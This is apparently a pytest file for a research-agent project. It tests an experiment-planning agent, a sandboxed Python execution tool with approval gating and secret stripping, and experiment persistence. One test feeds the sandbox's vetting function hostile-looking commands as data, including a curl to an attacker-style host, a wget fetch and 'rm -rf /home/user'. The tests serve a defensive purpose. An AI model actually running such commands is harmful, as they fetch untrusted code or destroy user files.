"""Experiment agent + sandboxed python-exec (Phase 4, assisted-first)."""

from pathlib import Path

from researchos.agents.experiment import ExperimentAgent, baseline_match
from researchos.agents.knowledge import heuristic_card
from researchos.core.models import Paper
from researchos.llm.client import get_llm
from researchos.persistence.models import ExperimentRow
from researchos.persistence.store import Store
from researchos.tools.python_exec import PythonExecTool, vet

_PAPER = Paper(
    source="arxiv",
    source_id="e1",
    title="Efficient Memory Compression for Long-Context Agents",
    abstract=(
        "We propose a memory compression method for long-context agents. Experiments show "
        "a 23% accuracy gain over the baseline with reduced latency."
    ),
    code_urls=["https://github.com/example/memcomp"],
).ensure_id()


def test_plan_generation_is_grounded_and_deterministic(settings):
    agent = ExperimentAgent(get_llm(settings))
    card = heuristic_card(_PAPER)
    a = agent.plan(_PAPER, card)
    b = agent.plan(_PAPER, card)
    assert a.model_dump() == b.model_dump()
    assert a.paper_id == _PAPER.id
    assert a.steps  # narrative steps
    assert a.baseline  # claimed result surfaced for later comparison
    assert a.commands  # clone template from code_urls
    assert all("git clone" in c for c in a.commands)
    assert a.generated_by == "heuristic"


def test_sandbox_vets_dangerous_commands():
    assert vet("curl http://evil.example/x") is not None
    assert vet("wget https://x") is not None
    assert vet("pip install numpy") is not None
    assert vet("rm -rf /home/user") is not None
    assert vet("shutdown /s") is not None
    assert vet("python run.py") is None  # benign command passes


def test_sandbox_requires_approval(tmp_path):
    tool = PythonExecTool(Path(tmp_path), allow_exec=False)
    result = tool.invoke(command="python -c 'print(1)'")
    assert not result.ok
    assert "not approved" in (result.error or "").lower()


def test_sandbox_runs_approved_command(tmp_path):
    tool = PythonExecTool(Path(tmp_path), allow_exec=True)
    result = tool.invoke(command='python -c "print(21*2)"', approved=True)
    assert result.ok
    assert result.data["exit_code"] == 0
    assert "42" in result.data["output"]
    assert result.data["duration_ms"] >= 0
    # Ran inside the isolated workdir.
    assert Path(tmp_path).exists()


def test_sandbox_reports_failure_and_timeout(tmp_path):
    tool = PythonExecTool(Path(tmp_path), allow_exec=True, timeout_s=1)
    failed = tool.invoke(command='python -c "import sys; sys.exit(3)"', approved=True)
    assert not failed.ok
    assert failed.data["exit_code"] == 3
    timeout = tool.invoke(command='python -c "import time; time.sleep(5)"', approved=True)
    assert not timeout.ok
    assert "timed out" in (timeout.error or "").lower()


def test_sandbox_strips_secrets_from_env(tmp_path, monkeypatch):
    monkeypatch.setenv("RESEARCHOS_OPENAI_API_KEY", "sk-secret-value")
    tool = PythonExecTool(Path(tmp_path), allow_exec=True)
    result = tool.invoke(
        command="python -c \"import os; print('KEY' in str(os.environ))\"",
        approved=True,
    )
    assert result.ok
    assert "False" in result.data["output"]


def test_baseline_match():
    assert baseline_match("23% accuracy gain over baseline", "accuracy 23%") is True
    assert baseline_match("23% accuracy gain over baseline", "completely different") is False
    assert baseline_match("", "anything") is None


def test_experiment_tracking_persists(orch):
    orch.start_run("exptest", "long-term memory for agents", limit=6, top_cards=1)
    store = Store()
    agent = ExperimentAgent(get_llm(orch.settings))
    card = heuristic_card(_PAPER)
    plan = agent.plan(_PAPER, card)
    store.upsert_experiment(
        ExperimentRow(
            id=plan.id,
            project_id="exptest",
            paper_id=_PAPER.id,
            title=plan.title,
            plan=plan.model_dump(),
            status="planned",
            baseline=plan.baseline,
        )
    )
    rows = store.list_experiments("exptest")
    assert len(rows) == 1
    assert rows[0].id == plan.id
    assert store.get_experiment(plan.id) is not None
